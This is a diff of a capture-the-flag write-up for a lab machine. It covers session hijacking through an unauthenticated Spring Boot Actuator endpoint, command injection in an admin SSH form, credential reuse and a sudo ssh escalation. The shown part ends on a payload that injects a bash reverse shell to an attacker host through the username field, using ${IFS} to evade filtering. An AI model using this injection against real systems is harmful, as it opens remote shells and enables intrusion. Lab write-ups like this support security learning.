@@ -16,7 +16,7 @@ tags: [spring-boot, actuator, session-hijack, command-injection, postgres, gtfob
 
 ## TL;DR
 
-A **Spring Boot** app behind nginx. The **Actuator** is exposed without authentication: `/actuator/sessions` leaks live `JSESSIONID`s and allows **session hijacking** of `kanderson`. In the admin panel the SSH connection form has **command injection** in the username. The `.jar` hands over **PostgreSQL** credentials with hashes → `josh` → `sudo ssh` (GTFOBins).
+A **Spring Boot** app behind nginx. The **Actuator** is exposed without authentication: `/actuator/sessions` leaks live `JSESSIONID`s and allows **session hijacking** of `kanderson`. In the admin panel the SSH connection form has **command injection** in the username. The `.jar` hands over **PostgreSQL** credentials; the `users` table stores a bcrypt that is reused as `josh`, and `sudo ssh` (GTFOBins) finishes.
 
 ## Recon
 
@@ -35,10 +35,10 @@ nmap -p- -sCV <IP> -oN nmap.txt
 
 ```bash
 curl -s http://cozyhosting.htb/actuator/sessions
-# {"kanderson":"<JSESSIONID>"}
+# {"<JSESSIONID>":"kanderson","<JSESSIONID>":"UNAUTHORIZED"}
 ```
 
-With that cookie `/admin` opens, where the "Automatic SSH connection" form feeds `username` and `host` into `Runtime.exec` unsanitised:
+The JSON is **backwards from what it looks like**: the key is the session id and the value the username. With that cookie `/admin` opens, where the "Automatic SSH connection" form feeds `username` and `host` into `Runtime.exec` unsanitised:
 
 ```text
 username=;bash${IFS}-c${IFS}'bash -i >& /dev/tcp/<LHOST>/4444 0>&1';&host=x
